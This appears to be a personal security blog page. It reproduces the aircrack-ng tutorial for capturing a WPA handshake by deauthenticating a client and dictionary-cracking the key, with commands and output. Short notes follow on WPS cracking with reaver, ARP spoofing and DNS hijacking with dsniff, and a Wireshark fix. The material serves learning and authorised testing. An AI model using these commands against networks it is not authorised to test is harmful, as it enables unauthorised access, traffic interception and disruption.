      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/15/Security/无线安全/Aircrack-ng/">Aircrack-ng</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="How-a-wireless-network-is-found"><a href="#How-a-wireless-network-is-found" class="headerlink" title="How a wireless network is found"></a>How a wireless network is found</h2><p>This is a short introduction into managed networks, these ones working with Access Points (AP). Every AP sends out about 10 so called beacon frames a second. These packets contain the following information:</p>
<ul>
<li>Name of the network (ESSID)</li>
<li>If encryption is used (and what encryption is used; pay attention, that may not be always true just because the AP advertises it)</li>
<li>What MBit data rates are supported</li>
<li>Which channel the network is on</li>
</ul>
<p>This information is then shown in your tool that connects to this network. It is shown when you let your card scan for networks with <strong>iwlist <interface> scan</interface></strong> and when you run <a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a>.</p>
<h2 id="Discovering-Networks"><a href="#Discovering-Networks" class="headerlink" title="Discovering Networks"></a>Discovering Networks</h2><p>The first thing to do is looking out for a potential target. The aircrack-ng suite contains <a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a> for this - but other programs like<a href="http://www.kismetwireless.net/" target="_blank" rel="noopener">Kismet</a> can be used too.</p>
<p>Prior to looking for networks, you must put your wireless card into what is called “monitor mode”. Monitor mode is a special mode that allows your PC to listen to every wireless packet. This monitor mode also allows you to optionally inject packets into a network. Injection will be covered later in this tutorial.</p>
<p>To put your wireless card into monitor mode:</p>
<p><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener">airmon-ng</a> start rausb0</p>
<p>To confirm it is in monitor mode, run “iwconfig” and confirm the mode. The <a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank" rel="noopener">airmon-ng page</a> on the Wiki has generic information and how to start it for other drivers.</p>
<p>Then, start airodump-ng to look out for networks:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng rausb0</span><br></pre></td></tr></table></figure>
<p>“rausb0” is the network interface (nic) name. If you are using a different WLAN device than a rt2570 you’ll have to use a different nic name. Take a look in the documentation of the nic driver. For most newer drivers, the primary interface name is “wlan0”, but for monitoring, a secondary interface (“mon0”, created when you run airmon-ng) is used.</p>
<p>If airodump-ng could connect to the WLAN device, you’ll see a screen like this:</p>
<p><a href="http://www.aircrack-ng.org/lib/exe/fetch.php?tok=23e9a2&amp;media=http%3A%2F%2Fwww.aircrack-ng.org%2Fimg%2Fnewbie_airodump.png" target="_blank" rel="noopener"><img src="http://www.aircrack-ng.org/lib/exe/fetch.php?tok=23e9a2&amp;media=http%3A%2F%2Fwww.aircrack-ng.org%2Fimg%2Fnewbie_airodump.png" alt="img"></a></p>
<p><a href="http://www.aircrack-ng.org/doku.php?id=airodump-ng" target="_blank" rel="noopener">airodump-ng</a> hops from channel to channel and shows all access points it can receive beacons from. Channels 1 to 14 are used for 802.11b and g (in US, they only are allowed to use 1 to 11; 1 to 13 in Europe with some special cases; 1-14 in Japan). Channels between 36 and 149 are used for 802.11a. The current channel is shown in the top left corner.</p>
<p>After a short time some APs and (hopefully) some associated clients will show up.</p>
<p>The upper data block shows the access points found:</p>
<table>
<thead>
<tr>
<th>BSSID</th>
<th>The MAC address of the AP</th>
</tr>
</thead>
<tbody>
<tr>
<td>PWR</td>
<td>Signal strength. Some drivers don’t report it</td>
</tr>
<tr>
<td>Beacons</td>
<td>Number of beacon frames received. If you don’t have a signal strength you can estimate it by the number of beacons: the more beacons, the better the signal quality</td>
</tr>
<tr>
<td>Data</td>
<td>Number of data frames received</td>
</tr>
<tr>
<td>CH</td>
<td>Channel the AP is operating on</td>
</tr>
<tr>
<td>MB</td>
<td>Speed or AP Mode. 11 is pure 802.11b, 54 pure 802.11g. Values between are a mixture</td>
</tr>
<tr>
<td>ENC</td>
<td>Encryption: OPN: no encryption, WEP: WEP encryption, WPA: WPA or WPA2 encryption, WEP?: WEP or WPA (don’t know yet)</td>
</tr>
<tr>
<td>ESSID</td>
<td>The network name. Sometimes hidden</td>
</tr>
</tbody>
</table>
<p>The lower data block shows the clients found:</p>
<table>
<thead>
<tr>
<th>BSSID</th>
<th>The MAC of the AP this client is associated to</th>
</tr>
</thead>
<tbody>
<tr>
<td>STATION</td>
<td>The MAC of the client itself</td>
</tr>
<tr>
<td>PWR</td>
<td>Signal strength. Some drivers don’t report it</td>
</tr>
<tr>
<td>Packets</td>
<td>Number of data frames received</td>
</tr>
<tr>
<td>Probes</td>
<td>Network names (ESSIDs) this client has probed</td>
</tr>
</tbody>
</table>
<p>Now you should look out for a target network. It should have a client connected because cracking networks without a client is an advanced topic (See <a href="http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients" target="_blank" rel="noopener">How to crack wep with no clients</a>). It should use WEP encryption and have a high signal strength. Maybe you can re-position your antenna to get a better signal. Often a few centimeters make a big difference in signal strength.</p>
<p>In the example above the net 00:01:02:03:04:05 would be the only possible target because it’s the only one with an associated client. But it also has a high signal strength so it’s really a good target to practice.</p>
<h2 id="Injection-test"><a href="#Injection-test" class="headerlink" title="Injection test"></a>Injection test</h2><h3 id="Basic-Test"><a href="#Basic-Test" class="headerlink" title="Basic Test"></a>Basic Test</h3><p>This is a basic test to determine if you card successfully supports injection.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -9 wlan0</span><br></pre></td></tr></table></figure>
<p>The system responds:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">16:29:41  wlan0 channel: 9</span><br><span class="line">16:29:41  Trying broadcast probe requests...</span><br><span class="line">16:29:41  Injection is working!</span><br><span class="line">16:29:42  Found 5 APs</span><br><span class="line"></span><br><span class="line">16:29:42  Trying directed probe requests...</span><br><span class="line">16:29:42  00:09:5B:5C:CD:2A - channel: 11 - &apos;NETGEAR&apos;</span><br><span class="line">16:29:48  0/30: 0%</span><br><span class="line">16:29:48  00:14:BF:A8:65:AC - channel: 9 - &apos;title&apos;</span><br><span class="line">16:29:54  0/30: 0%</span><br><span class="line">16:29:54  00:14:6C:7E:40:80 - channel: 9 - &apos;teddy&apos;</span><br><span class="line">16:29:55  Ping (min/avg/max): 2.763ms/4.190ms/8.159ms</span><br><span class="line">16:29:55  27/30: 90%</span><br><span class="line">16:29:55  00:C0:49:E2:C4:39 - channel: 11 - &apos;mossy&apos;</span><br><span class="line">16:30:01  0/30: 0%</span><br><span class="line">16:30:01  00:0F:66:C3:14:4E - channel: 9 - &apos;tupper&apos;</span><br><span class="line">16:30:07  0/30: 0%</span><br></pre></td></tr></table></figure>
<p>Analysis of the response:</p>
<ul>
<li><strong>16:29:41 wlan0 channel: 9</strong>: This tells you which interface was used and the channel it was running on.</li>
<li><strong>16:29:41 Injection is working!</strong>: This confirms your card can inject.</li>
<li><strong>16:29:42 Found 5 APs</strong>: These access points (APs) were found either through the broadcast probes or received beacons.</li>
<li><strong>16:29:42 00:09:5B:5C:CD:2A - channel: 11 - ‘NETGEAR’</strong>: Notice that this AP is on channel 11 and not on our card channel of 9. It is common for adjacent channels to spill over.</li>
<li><strong>16:29:55 Ping (min/avg/max): 2.763ms/4.190ms/8.159ms</strong>: It an AP responds with one or more packets then the ping times are calculated.</li>
<li><strong>16:29:55 27/30: 90%</strong> for teddy: This is the only AP that the card can successfully communicate with. This is another verification that your card can inject. You will also notice that all the other APs have 0%.</li>
</ul>
<h3 id="Hidden-or-Specific-SSID"><a href="#Hidden-or-Specific-SSID" class="headerlink" title="Hidden or Specific SSID"></a>Hidden or Specific SSID</h3><p>You can check a hidden SSID or check a specific SSID with the following command:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng --test -e teddy -a 00:14:6C:7E:40:80 ath0</span><br></pre></td></tr></table></figure>
<p>The system responds:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">11:01:06  ath0 channel: 9</span><br><span class="line">11:01:06  Trying broadcast probe requests...</span><br><span class="line">11:01:06  Injection is working!</span><br><span class="line">11:01:07  Found 1 APs</span><br><span class="line"></span><br><span class="line">11:01:07  Trying directed probe requests...</span><br><span class="line">11:01:07  00:14:6C:7E:40:80 - channel: 9 - &apos;teddy&apos;</span><br><span class="line">11:01:07  Ping (min/avg/max): 2.763ms/4.190ms/8.159ms</span><br><span class="line">11:01:07  30/30: 100%</span><br></pre></td></tr></table></figure>
<h2 id="Start-airodump-ng-to-collect-authentication-handshake"><a href="#Start-airodump-ng-to-collect-authentication-handshake" class="headerlink" title="Start airodump-ng to collect authentication handshake"></a>Start airodump-ng to collect authentication handshake</h2><p>The purpose of this step is to run airodump-ng to capture the 4-way authentication handshake for the AP we are interested in. </p>
<p>Enter:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk ath0</span><br></pre></td></tr></table></figure>
<p>Where:</p>
<ul>
<li>-c 9 is the channel for the wireless network</li>
<li>-<code></code>-bssid 00:14:6C:7E:40:80 is the access point MAC address. This eliminates extraneous traffic.</li>
<li>-w psk is the file name prefix for the file which will contain the IVs.</li>
<li>ath0 is the interface name.</li>
</ul>
<p>Important: Do NOT use the “-<code></code>-ivs” option. You must capture the full packets.</p>
<p>Here what it looks like if a wireless client is connected to the network:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80</span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</span><br><span class="line">                                                                                                             </span><br><span class="line">00:14:6C:7E:40:80   39 100       51      116   14   9  54  WPA2 CCMP   PSK  teddy                           </span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              STATION            PWR  Lost  Packets  Probes                                             </span><br><span class="line">                                                                                                             </span><br><span class="line">00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35     0      116</span><br></pre></td></tr></table></figure>
<p>In the screen above, notice the “WPA handshake: 00:14:6C:7E:40:80” in the top right-hand corner. This means airodump-ng has successfully captured the four-way handshake.</p>
<p>Here it is with no connected wireless clients:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CH  9 ][ Elapsed: 4 s ][ 2007-03-24 17:51 </span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID</span><br><span class="line">                                                                                                             </span><br><span class="line">00:14:6C:7E:40:80   39 100       51        0    0   9  54  WPA2 CCMP   PSK  teddy                           </span><br><span class="line">                                                                                                             </span><br><span class="line">BSSID              STATION            PWR  Lost  Packets  Probes</span><br></pre></td></tr></table></figure>
<h2 id="Use-aireplay-ng-to-deauthenticate-the-wireless-client"><a href="#Use-aireplay-ng-to-deauthenticate-the-wireless-client" class="headerlink" title="Use aireplay-ng to deauthenticate the wireless client"></a>Use aireplay-ng to deauthenticate the wireless client</h2><p>This step is optional. If you are patient, you can wait until airodump-ng captures a handshake when one or more clients connect to the AP. You only perform this step if you opted to actively speed up the process. The other constraint is that there must be a wireless client currently associated with the AP. If there is no wireless client currently associated with the AP, then you have to be patient and wait for one to connect to the AP so that a handshake can be captured. Needless to say, if a wireless client shows up later and airodump-ng did not capture the handshake, you can backtrack and perform this step.</p>
<p>This step sends a message to the wireless client saying that that it is no longer associated with the AP. The wireless client will then hopefully reauthenticate with the AP. The reauthentication is what generates the 4-way authentication handshake we are interested in collecting. This is what we use to break the WPA/WPA2 pre-shared key.</p>
<p>Based on the output of airodump-ng in the previous step, you determine a client which is currently connected. You need the MAC address for the following. Open another console session and enter:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 ath0</span><br></pre></td></tr></table></figure>
<p>Where:</p>
<ul>
<li>-0 means deauthentication</li>
<li>1 is the number of deauths to send (you can send multiple if you wish)</li>
<li>-a 00:14:6C:7E:40:80 is the MAC address of the access point</li>
<li>-c 00:0F:B5:FD:FB:C2 is the MAC address of the client you are deauthing</li>
<li>ath0 is the interface name</li>
</ul>
<p>Here is what the output looks like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11:09:28  Sending DeAuth to station   -- STMAC: [00:0F:B5:34:30:30]</span><br></pre></td></tr></table></figure>
<p>With luck this causes the client to reauthenticate and yield the 4-way handshake.</p>
<h2 id="Run-aircrack-ng-to-crack-the-pre-shared-key"><a href="#Run-aircrack-ng-to-crack-the-pre-shared-key" class="headerlink" title="Run aircrack-ng to crack the pre-shared key"></a>Run aircrack-ng to crack the pre-shared key</h2><p>The purpose of this step is to actually crack the WPA/WPA2 pre-shared key. To do this, you need a dictionary of words as input. Basically, aircrack-ng takes each word and tests to see if this is in fact the pre-shared key.</p>
<p>There is a small dictionary that comes with aircrack-ng - “password.lst”. This file can be found in the “test” directory of the aircrack-ng source code. The <a href="http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists" target="_blank" rel="noopener">Wiki FAQ</a> has an extensive list of dictionary sources. You can use <a href="http://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper</a> (JTR) to generate your own list and pipe them into <a href="http://www.aircrack-ng.org/doku.php?id=aircrack-ng" target="_blank" rel="noopener">aircrack-ng</a>. Using JTR in conjunction with aircrack-ng is beyond the scope of this tutorial.</p>
<p>Open another console session and enter:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk*.cap</span><br></pre></td></tr></table></figure>
<p>Where:</p>
<ul>
<li>-w password.lst is the name of the dictionary file. Remember to specify the full path if the file is not located in the same directory.</li>
<li><em>.cap is name of group of files containing the captured packets. Notice in this case that we used the wildcard </em> to include multiple files.</li>
</ul>
<p>Here is typical output when there are no handshakes found:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Opening psk-01.cap</span><br><span class="line">Opening psk-02.cap</span><br><span class="line">Opening psk-03.cap</span><br><span class="line">Opening psk-04.cap</span><br><span class="line">Read 1827 packets.</span><br><span class="line"></span><br><span class="line">No valid WPA handshakes found.</span><br></pre></td></tr></table></figure>
<p>When this happens you either have to redo step 3 (deauthenticating the wireless client) or wait longer if you are using the passive approach. When using the passive approach, you have to wait until a wireless client authenticates to the AP.</p>
<p>Here is typical output when handshakes are found:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Opening psk-01.cap</span><br><span class="line">Opening psk-02.cap</span><br><span class="line">Opening psk-03.cap</span><br><span class="line">Opening psk-04.cap</span><br><span class="line">Read 1827 packets.</span><br><span class="line"></span><br><span class="line">#  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">1  00:14:6C:7E:40:80  teddy                     WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br></pre></td></tr></table></figure>
<p>Now at this point, aircrack-ng will start attempting to crack the pre-shared key. Depending on the speed of your CPU and the size of the dictionary, this could take a long time, even days. </p>
<p>Here is what successfully cracking the pre-shared key looks like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                           Aircrack-ng 0.8</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">             [00:00:00] 2 keys tested (37.20 k/s)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">                     KEY FOUND! [ 12345678 ]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Master Key     : CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E </span><br><span class="line">                 B8 A6 13 C5 4A 72 82 38 ED C3 7E 2C 59 5E AB FD </span><br><span class="line"> </span><br><span class="line">Transcient Key : 06 F8 BB F3 B1 55 AE EE 1F 66 AE 51 1F F8 12 98 </span><br><span class="line">                 CE 8A 9D A0 FC ED A6 DE 70 84 BA 90 83 7E CD 40 </span><br><span class="line">                 FF 1D 41 E1 65 17 93 0E 64 32 BF 25 50 D5 4A 5E </span><br><span class="line">                 2B 20 90 8C EA 32 15 A6 26 62 93 27 66 66 E0 71 </span><br><span class="line"> </span><br><span class="line">EAPOL HMAC     : 4E 27 D9 5B 00 91 53 57 88 9C 66 C8 B1 29 D1 CB</span><br></pre></td></tr></table></figure>
<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>source: <a href="http://www.aircrack-ng.org/doku.php?id=cracking_wpa#troubleshooting_tips" target="_blank" rel="noopener">http://www.aircrack-ng.org/doku.php?id=cracking_wpa#troubleshooting_tips</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Security/">Security</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wifi/">Wifi</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Security/无线安全/reaver" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/04/18/Security/无线安全/reaver/" class="article-date">
      <time datetime="2018-04-18T08:02:06.000Z" itemprop="datePublished">2018-04-18</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/18/Security/无线安全/reaver/">reaver</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="扫描使用wps的Wi-Fi"><a href="#扫描使用wps的Wi-Fi" class="headerlink" title="扫描使用wps的Wi-Fi"></a>扫描使用wps的Wi-Fi</h3><p><code>wash -i en0</code></p>
<h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p><code>reaver -i en0 [-b mac] -vv [-c channel]</code></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Security/">Security</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wifi/">Wifi</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Security/无线安全/Dsniff" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/04/25/Security/无线安全/Dsniff/" class="article-date">
      <time datetime="2018-04-25T15:44:10.000Z" itemprop="datePublished">2018-04-25</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/25/Security/无线安全/Dsniff/">Dsniff</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><p>nmap   百度教程：<a href="https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/47a29f24312010c0142399f1.html</a></p>
<h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p><code>arpspoof -i eth0 -t [target_ip] [host_ip]</code></p>
<h3 id="开启路由转发"><a href="#开启路由转发" class="headerlink" title="开启路由转发"></a>开启路由转发</h3><p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
<h3 id="url嗅探"><a href="#url嗅探" class="headerlink" title="url嗅探"></a>url嗅探</h3><p>urlsnarf</p>
<h3 id="查看图片"><a href="#查看图片" class="headerlink" title="查看图片"></a>查看图片</h3><p>ettercap</p>
<h3 id="dns劫持"><a href="#dns劫持" class="headerlink" title="dns劫持"></a>dns劫持</h3><p>前提是双端都做了arp欺骗</p>
<p><code>dnsspoof -i eth0 [-f file]</code></p>
<h3 id="一些特殊事项"><a href="#一些特殊事项" class="headerlink" title="一些特殊事项"></a>一些特殊事项</h3><h4 id="mac-os要开启软网卡"><a href="#mac-os要开启软网卡" class="headerlink" title="mac os要开启软网卡"></a>mac os要开启软网卡</h4><p><code>sudo chmod 777 /dev/bpf*</code></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Security/">Security</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wifi/">Wifi</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-Security/无线安全/wireshark fatal IO error 2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/04/15/Security/无线安全/wireshark fatal IO error 2/" class="article-date">
      <time datetime="2018-04-15T06:23:44.000Z" itemprop="datePublished">2018-04-15</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/04/15/Security/无线安全/wireshark fatal IO error 2/">kali vnc wireshark fatal IO error 2</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><em># wireshark</em></p>
<p>failed to get the current screen resources<br>The X11 connection broke: I/O error (code 1)<br>XIO: fatal IO error 2 (No such file or directory) on X server “localhost:10.0”<br>after 349 requests (349 known processed) with 0 events remaining.</p>
<p>Try using wireshark-gtk by installing</p>
<p><em># apt install wireshark-gtk</em></p>
<p>Now just run </p>
<p><em># wireshark-gtk</em></p>
<p>No errors. If you continue to get errors please comment below.</p>
<p>source : <a href="https://www.linuxsecrets.com/discussions/9991-the-x11-connection-broke-i-o-error-code-1" target="_blank" rel="noopener">https://www.linuxsecrets.com/discussions/9991-the-x11-connection-broke-i-o-error-code-1</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Security/">Security</a>
    </div>


      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Wifi/">Wifi</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/9/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/11/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2017-2019 Skuaka
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style="display:none">
                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style="display:none">
                        <span id="page-visit" title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 1;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>